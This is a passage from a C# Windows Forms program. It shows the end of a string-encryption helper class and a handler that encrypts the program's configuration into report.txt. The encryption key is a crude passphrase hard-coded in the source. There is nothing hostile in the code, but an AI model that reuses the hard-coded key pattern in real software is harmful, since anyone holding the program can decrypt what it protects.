                        using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                        {
                            using (var memoryStream = new MemoryStream(cipherTextBytes))
                            {
                                using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                                {
                                    var plainTextBytes = new byte[cipherTextBytes.Length];
                                    var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                    memoryStream.Close();
                                    cryptoStream.Close();
                                    return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                                }
                            }
                        }
                    }
                }
            }

            private static byte[] Generate256BitsOfRandomEntropy()
            {
                var randomBytes = new byte[32]; // 32 Bytes will give us 256 bits.
                using (var rngCsp = new RNGCryptoServiceProvider())
                {
                    // Fill the array with cryptographically secure random bytes.
                    rngCsp.GetBytes(randomBytes);
                }
                return randomBytes;
            }
        }

        private void reportB_Click(object sender, EventArgs e)
        {
            File.WriteAllText("report.txt", StringCipher.Encrypt(BuildConfig(), "cock"));
            DarkMessageBox.ShowInformation("Report exported to report.txt", "Reported", DarkDialogButton.Ok);
        }

        private void mainPanel_Paint(object sender, PaintEventArgs e)
        {

        }

        private void accTree_Click(object sender, EventArgs e)
        {

        }
    }
}
